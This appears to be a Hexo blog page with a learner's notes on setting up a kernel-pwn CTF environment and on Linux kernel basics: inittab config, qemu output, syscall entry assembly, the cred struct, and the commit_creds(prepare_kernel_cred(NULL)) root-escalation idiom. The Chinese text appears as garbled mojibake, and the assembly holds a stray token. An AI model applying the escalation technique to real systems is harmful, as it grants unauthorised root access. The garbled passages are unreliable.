<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="æˆ‘çš„åšå®¢">
<meta property="og:type" content="website">
<meta property="og:title" content="study">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="æˆ‘çš„åšå®¢">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/10/%E5%86%85%E6%A0%B8pwn%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E5%88%9D%E8%AE%A4%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/10/%E5%86%85%E6%A0%B8pwn%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E5%88%9D%E8%AE%A4%E8%AF%86/" class="post-title-link" itemprop="url">å†…æ ¸pwnçš„ç¯å¢ƒæ­å»ºå’Œåˆè®¤è¯†</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-02-10 20:31:19 / ä¿®æ”¹æ—¶é—´ï¼š20:33:39" itemprop="dateCreated datePublished" datetime="2022-02-10T20:31:19+08:00">2022-02-10</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="å†…æ ¸pwn"><a href="#å†…æ ¸pwn" class="headerlink" title="å†…æ ¸pwn"></a>å†…æ ¸pwn</h1><p>ä»Šå¤©å°±å…ˆä¸åˆ·pwnabe.twä¸Šçš„é¢˜äº†ï¼Œå¼€æ•´å†…æ ¸æ–¹é¢çš„ä¸œè¥¿ã€‚</p>
<h2 id="0x1-ç¯å¢ƒæ­å»º"><a href="#0x1-ç¯å¢ƒæ­å»º" class="headerlink" title="0x1 ç¯å¢ƒæ­å»º"></a>0x1 ç¯å¢ƒæ­å»º</h2><p>æ­å»º1èµ·æ¥æ²¡æœ‰lotç¯å¢ƒæ­å»ºå›°éš¾ï¼Œé€šè¿‡æ­å»ºç¯å¢ƒä¹Ÿäº†è§£äº†å¾ˆå¤šä¸œè¥¿ï¼Œæˆ‘ç¬¬ä¸€æ¬¡çŸ¥é“æ–‡ä»¶ç³»ç»Ÿå±…ç„¶æ˜¯ç‹¬ç«‹çš„ï¼Œä»¥å‰ä»¥ä¸ºä¸€ç›´å’Œå†…æ ¸ç´§å¯†ç›¸è¿ï¼Œä¹Ÿè¶Šæ¥è¶Šç†è§£ä¸€åˆ‡çš†æ–‡ä»¶è¿™å¥è¯äº†ï¼Œä¸ç®¡æ˜¯è®¾å¤‡è¿˜æ˜¯ä»€ä¹ˆï¼Œéƒ½å¯ä»¥å½“åšæ–‡ä»¶æ“ä½œï¼ŒçœŸçš„å¾ˆç¥å¥‡ã€‚</p>
<p>æˆ‘æ˜¯å€Ÿé‰´ï¼ˆç…§æŠ„ï¼‰è¿™ä¸ªåšå®¢æ­å»ºç¯å¢ƒçš„<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/258874%EF%BC%8C%E5%86%99%E7%9A%84%E5%BE%88%E7%BB%86%E5%BE%88%E6%A3%92%EF%BC%8C%E4%B8%8D%E4%BB%85%E8%AE%B2%E4%BA%86%E4%B8%80%E4%BA%9B%E5%8E%9F%E7%90%86%EF%BC%8C%E8%BF%98%E5%BE%88%E7%BB%86%E8%87%B4%E7%9A%84%E6%8A%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%AE%B2%E6%98%8E%E7%99%BD%E4%BA%86%EF%BC%8C%E5%9C%A8%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E6%88%91%E4%B8%BB%E8%A6%81%E5%8D%A1%E5%9C%A8%E4%B8%A4%E4%B8%AA%E5%9C%B0%E6%96%B9%E4%BA%86%EF%BC%8C%E4%B8%80%E4%B8%AA%E6%98%AF%E6%88%91%E4%B8%8D%E4%BA%86%E8%A7%A3Makefile,%E6%8A%8AM%E5%B0%8F%E5%86%99%E4%BA%86%EF%BC%8C%E5%AF%BC%E8%87%B4%E7%BC%96%E8%AF%91%E6%A8%A1%E5%9D%97%E7%9A%84%E6%97%B6%E5%80%99%E4%B8%80%E7%9B%B4%E4%B8%8D%E6%88%90%E5%8A%9F%EF%BC%8C%E5%BD%93%E6%97%B6%E9%83%BD%E5%BF%AB%E8%87%AA%E9%97%AD%E4%BA%86%EF%BC%8C%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%98%AF%E6%95%B4%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E5%9C%A8etc%E7%9A%84initab%E7%BC%96%E5%86%99%E7%9A%84%E6%97%B6%E5%80%99%E6%9C%89%E6%9D%A1%E6%8C%87%E4%BB%A4%E4%B8%8D%E8%83%BD%E7%85%A7%E6%90%AC%EF%BC%8C%E5%8E%9F%E5%8D%9A%E5%AE%A2%E6%8C%87%E4%BB%A4%E5%A6%82%E4%B8%8B">https://www.anquanke.com/post/id/258874ï¼Œå†™çš„å¾ˆç»†å¾ˆæ£’ï¼Œä¸ä»…è®²äº†ä¸€äº›åŸç†ï¼Œè¿˜å¾ˆç»†è‡´çš„æŠŠç¯å¢ƒæ­å»ºè®²æ˜ç™½äº†ï¼Œåœ¨æ­å»ºè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä¸»è¦å¡åœ¨ä¸¤ä¸ªåœ°æ–¹äº†ï¼Œä¸€ä¸ªæ˜¯æˆ‘ä¸äº†è§£Makefile,æŠŠMå°å†™äº†ï¼Œå¯¼è‡´ç¼–è¯‘æ¨¡å—çš„æ—¶å€™ä¸€ç›´ä¸æˆåŠŸï¼Œå½“æ—¶éƒ½å¿«è‡ªé—­äº†ï¼Œå¦ä¸€ä¸ªæ˜¯æ•´æ–‡ä»¶ç³»ç»Ÿçš„æ—¶å€™ï¼Œåœ¨etcçš„initabç¼–å†™çš„æ—¶å€™æœ‰æ¡æŒ‡ä»¤ä¸èƒ½ç…§æ¬ï¼ŒåŸåšå®¢æŒ‡ä»¤å¦‚ä¸‹</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::askfirst:/bin/ash</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure>

<p>æ­£ç¡®æŒ‡ä»¤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">ttyS0::askfirst:/bin/ash</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure>

<p>è‡³äºåŸå› ï¼Œæˆ‘æ²¡çœ‹æ‡‚ğŸ˜ƒï¼Œå‰©ä¸‹çš„ç…§æŠ„å°±è¡Œäº†ï¼Œç„¶åkernelå°±èƒ½é€šè¿‡qemuæ­£ç¡®è¿è¡Œäº†ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/pwn$ ./boot.sh</span><br><span class="line">warning: TCG doesn&#x27;t support requested feature: CPUID.01H:EDX.vme [bit 1]</span><br><span class="line">warning: TCG doesn&#x27;t support requested feature: CPUID.01H:EDX.vme [bit 1]</span><br><span class="line">mount: mounting none on /sys failed: No such device</span><br><span class="line"></span><br><span class="line">Please press Enter to activate this console. </span><br><span class="line">/ # ls</span><br><span class="line">bin      etc      init     lib64    proc     sbin     usr</span><br><span class="line">dev      home     lib      linuxrc  root     sys</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x2-å†…æ ¸åˆç†è§£"><a href="#0x2-å†…æ ¸åˆç†è§£" class="headerlink" title="0x2 å†…æ ¸åˆç†è§£"></a>0x2 å†…æ ¸åˆç†è§£</h2><h4 id="å†…æ ¸æ˜¯ä»€ä¹ˆä¸œè¥¿"><a href="#å†…æ ¸æ˜¯ä»€ä¹ˆä¸œè¥¿" class="headerlink" title="å†…æ ¸æ˜¯ä»€ä¹ˆä¸œè¥¿"></a>å†…æ ¸æ˜¯ä»€ä¹ˆä¸œè¥¿</h4><p>å†…æ ¸å¹¶ä¸æ˜¯ä»€ä¹ˆç¥å¥‡çš„ä¸œè¥¿ï¼Œä»–ä¹Ÿæ˜¯ä¸€ä¸ªç¨‹åºï¼Œä¸€åˆ‡çš„è¡Œä¸ºéƒ½æœ‰å¯¹åº”ä»£ç æ”¯æ’‘ï¼Œä»–çš„å®šä½å°±æ˜¯ä¸­é—´å±‚ï¼Œå¯¹ä¸Šæä¾›ç”¨æˆ·æ€ç¨‹åºçš„è¿è¡Œå’Œå¯¹ç”¨æˆ·æ€æä¾›æŠ½è±¡çš„æ“ä½œç¡¬ä»¶çš„api,å¯¹ä¸‹ç›´æ¥å’Œç¡¬ä»¶ç›¸äº’äº¤äº’çš„ç¨‹åºã€‚</p>
<h4 id="å†…æ ¸å’Œç”¨æˆ·æ€çš„åˆ‡æ¢"><a href="#å†…æ ¸å’Œç”¨æˆ·æ€çš„åˆ‡æ¢" class="headerlink" title="å†…æ ¸å’Œç”¨æˆ·æ€çš„åˆ‡æ¢"></a>å†…æ ¸å’Œç”¨æˆ·æ€çš„åˆ‡æ¢</h4><p>å½“å‘ç”Ÿç³»ç»Ÿè°ƒç”¨ï¼Œäº§ç”Ÿå¼‚å¸¸ï¼Œå¤–è®¾äº§ç”Ÿä¸­æ–­ç­‰äº‹ä»¶çš„æ—¶å€™ï¼Œä¼šå‘ç”Ÿç”¨æˆ·æ€åˆ°å†…æ ¸å¤ªçš„åˆ‡æ¢ï¼Œä¸€èˆ¬çš„å‡½æ•°è°ƒç”¨æ€è·¯å°±æ˜¯ä¿å­˜å½“å‰æ ˆå¸§çš„çŠ¶æ€ï¼Œç„¶åè·³åˆ°æ–°åœ°å€ï¼Œå†…æ ¸æ€å’Œç”¨æˆ·æ€çš„åˆ‡æ¢ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œå…¶ä¸­ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„åˆ‡æ¢å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼ˆç…§æ¬çš„ï¼‰</p>
<ol>
<li><p>é€šè¿‡ <code>swapgs</code> åˆ‡æ¢ GS æ®µå¯„å­˜å™¨ï¼ˆä»£ç æ®µå¯„å­˜å™¨ï¼‰ï¼Œå°† GS å¯„å­˜å™¨å€¼å’Œä¸€ä¸ªç‰¹å®šä½ç½®çš„å€¼è¿›è¡Œäº¤æ¢ï¼Œç›®çš„æ˜¯ä¿å­˜ GS å€¼ï¼ŒåŒæ—¶å°†è¯¥ä½ç½®çš„å€¼ä½œä¸ºå†…æ ¸æ‰§è¡Œæ—¶çš„ GS å€¼ä½¿ç”¨ã€‚</p>
</li>
<li><p>å°†å½“å‰æ ˆé¡¶ï¼ˆç”¨æˆ·ç©ºé—´æ ˆé¡¶ï¼‰è®°å½•åœ¨ CPU ç‹¬å å˜é‡åŒºåŸŸé‡Œï¼Œå°† CPU ç‹¬å åŒºåŸŸé‡Œè®°å½•çš„å†…æ ¸æ ˆé¡¶æ”¾å…¥<code>RSP/ESP</code>ã€‚</p>
</li>
<li><p>é€šè¿‡ push ä¿å­˜å„å¯„å­˜å™¨å€¼ï¼Œå…·ä½“çš„</p>
<p>ä»£ç å¦‚ä¸‹:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line">/* SWAPGS_UNSAFE_STACKæ˜¯ä¸€ä¸ªå®ï¼Œx86ç›´æ¥å®šä¹‰ä¸ºswapgsæŒ‡ä»¤ */</span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line">/* ä¿å­˜æ ˆå€¼ï¼Œå¹¶è®¾ç½®å†…æ ¸æ ˆ */</span><br><span class="line">movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">/* é€šè¿‡pushä¿å­˜å¯„å­˜å™¨å€¼ï¼Œå½¢æˆä¸€ä¸ªpt_regsç»“æ„ */</span><br><span class="line">/* Construct struct pt_regs on stack */</span><br><span class="line">pushq  $__USER_DS                /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11                      /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS                /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx                      /* pt_regs-&gt;ip */</span><br><span class="line">pushq  %rax                      /* pt_regs-&gt;orig_ax */</span><br><span class="line">pushq  %rdi                      /* pt_regs-&gt;di */</span><br><span class="line">pushq  %rsi                      /* pt_regs-&gt;si */</span><br><span class="line">pushq  %rdx                      /* pt_regs-&gt;dx */</span><br><span class="line">pushq  %rcx tuichu               /* pt_regs-&gt;cx */</span><br><span class="line">pushq  $-ENOSYS                  /* pt_regs-&gt;ax */</span><br><span class="line">pushq  %r8                       /* pt_regs-&gt;r8 */</span><br><span class="line">pushq  %r9                       /* pt_regs-&gt;r9 */</span><br><span class="line">pushq  %r10                      /* pt_regs-&gt;r10 */</span><br><span class="line">pushq  %r11                      /* pt_regs-&gt;r11 */</span><br><span class="line">sub $(6*8), %rsp                 /* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></figure></li>
</ol>
<p>å†…æ ¸æ€åˆ°ç”¨æˆ·æ€çš„åˆ‡æ¢ä¹Ÿæ˜¯å¦‚æ­¤</p>
<h4 id="å†…æ ¸çš„åˆ†çº§ä¿æŠ¤åŸŸ"><a href="#å†…æ ¸çš„åˆ†çº§ä¿æŠ¤åŸŸ" class="headerlink" title="å†…æ ¸çš„åˆ†çº§ä¿æŠ¤åŸŸ"></a>å†…æ ¸çš„åˆ†çº§ä¿æŠ¤åŸŸ</h4><p>ç®€ç§°rings,æ„Ÿè§‰å°±æ˜¯æƒé™çš„æ„æ€ï¼Œå¤§éƒ¨åˆ†ç°ä»£æ“ä½œç³»ç»Ÿåªé‡‡ç”¨ring0æƒé™å’Œring3æƒé™ï¼Œring0æƒé™å°±æ˜¯root,kernelå°±æ˜¯ring0ï¼Œring3æƒé™è¾ƒä½ï¼Œä¸€èˆ¬ç”¨æˆ·æ€ç¨‹åºå°±æ˜¯ring3,ä»¥æˆ‘ç›®å‰çš„ç²—ç•¥ç†è§£ï¼Œkernelpwnå°±æ˜¯é€šè¿‡å†…æ ¸æ¨¡å—çš„æ¼æ´å¯¹ç”¨æˆ·æ€ç¨‹åºè¿›è¡Œææƒåˆ°rootç„¶ågetshellã€‚</p>
<h4 id="è¿›ç¨‹ç®¡ç†"><a href="#è¿›ç¨‹ç®¡ç†" class="headerlink" title="è¿›ç¨‹ç®¡ç†"></a>è¿›ç¨‹ç®¡ç†</h4><p>kernelè°ƒåº¦ç€æ‰€æœ‰ç³»ç»Ÿèµ„æºï¼Œè¿›ç¨‹ä¹Ÿæ˜¯èµ„æºï¼Œä¹Ÿå½’kernelç®¡ï¼Œç®¡ç†çš„ç­–ç•¥å°±æ˜¯ä½¿ç”¨ç»“æ„ä½“ <code>task_struct</code> è®°å½•è¿›ç¨‹ä¿¡æ¯ï¼Œæ¯ä¸ª<code>task_struct</code>éƒ½è®°å½•ç€ä¸€ä¸ªè¿›ç¨‹çš„ä¿¡æ¯ï¼Œå…¶ä¸­åˆæœ‰ä¸“é—¨çš„ç»“æ„ä½“credè®°å½•ç¨‹åºçš„æƒé™ï¼Œæ¯ä¸ªç¨‹åºéƒ½æœ‰ä¸€ä¸ªcredç»“æ„ï¼Œå¦‚æœèƒ½ä¿®æ”¹å¯¹åº”è¿›ç¨‹çš„credï¼Œé‚£ä¹Ÿå°±èƒ½ä¿®æ”¹è¿™ä¸ªè¿›ç¨‹çš„æƒé™äº†ï¼Œç»“æ„ä½“æºç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;           <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;                   <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;                   <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;                  <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;                  <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;                  <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;                  <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;                 <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;                 <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits;            <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable;   <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;     <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;     <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;          <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;       <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;       <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">    /* keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span>      <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span>       <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span>     <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;             <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>          <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span>    <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>     <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>               <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<h4 id="è¿›ç¨‹æƒé™æ”¹å˜"><a href="#è¿›ç¨‹æƒé™æ”¹å˜" class="headerlink" title="è¿›ç¨‹æƒé™æ”¹å˜"></a>è¿›ç¨‹æƒé™æ”¹å˜</h4><p>è¿›ç¨‹ææƒä¸»è¦ä¾é ä¸¤ä¸ªååŠ›å®Œæˆã€‚</p>
<ul>
<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>ï¼šè¯¥å‡½æ•°ç”¨ä»¥æ‹·è´ä¸€ä¸ªè¿›ç¨‹çš„credç»“æ„ä½“ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–°çš„credç»“æ„ä½“ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<code>daemon</code>å‚æ•°åº”ä¸º<strong>æœ‰æ•ˆçš„è¿›ç¨‹æè¿°ç¬¦åœ°å€æˆ–NULL</strong>ï¼Œå‡å¦‚ä¼ å…¥çš„æ˜¯nullï¼Œé‚£å‡½æ•°å°±ä¼šè¿”å›ä¸€ä¸ªrootæƒé™çš„cred.</li>
<li><code>int commit_creds(struct cred *new)</code>ï¼šè¯¥å‡½æ•°ç”¨ä»¥å°†ä¸€ä¸ªæ–°çš„<code>cred</code>ç»“æ„ä½“åº”ç”¨åˆ°è¿›ç¨‹</li>
</ul>
<p>é€šè¿‡commit_creds(prepare_kernel_cred(NULL))è¿™å¥—ç»„åˆæ‹³å°±èƒ½æŠŠç”¨æˆ·æ€è¿›ç¨‹çš„credæ›´æ–°ä¸ºä¸€ä¸ªrootçš„cred.</p>
<p>ï¼ˆä¹Ÿæœ‰å¯èƒ½ç›´æ¥æº¢å‡ºæ”¹ï¼Œæˆ‘çŒœçš„ï¼Œæ¯•ç«Ÿè¿˜æ²¡åšè¿‡é¢˜ğŸ˜ƒï¼‰</p>
<h4 id="å†…æ ¸ä¿æŠ¤æœºåˆ¶"><a href="#å†…æ ¸ä¿æŠ¤æœºåˆ¶" class="headerlink" title="å†…æ ¸ä¿æŠ¤æœºåˆ¶"></a>å†…æ ¸ä¿æŠ¤æœºåˆ¶</h4><p><strong>KASLR</strong>ï¼šå†…æ ¸åœ°å€éšæœºåŒ–ï¼Œå’Œaslrç±»ä¼¼ï¼ŒçŸ¥é“äº†ä¸€ä¸ªåœ°å€å†åŠ ä¸Šä¸€ä¸ªåç§»å°±èƒ½çŸ¥é“åŸºåœ°å€äº†ï¼Œåœ¨æ²¡å¼€å¯KASLRçš„æ—¶å€™ï¼Œå†…æ ¸çš„åŸºåœ°å€æ˜¯0xffffffff81000000</p>
